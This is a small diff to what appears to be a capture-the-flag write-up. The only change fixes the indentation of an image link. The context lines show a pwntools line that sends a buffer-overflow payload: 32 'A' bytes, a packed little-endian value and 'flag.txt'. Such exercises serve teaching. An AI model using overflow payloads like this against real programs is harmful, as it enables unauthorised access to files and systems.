@@ -76,6 +76,6 @@ Since we're using little endian, the hexadecimal value had to be passed inverted
     r.recvuntil(b":")
     r.sendline(b"A" * 32 + p32(0xfefc2324) + b'flag.txt')
 
-    ![Alt text](images/semana5_desafio2.png)
+![Alt text](images/semana5_desafio2.png)
 
 
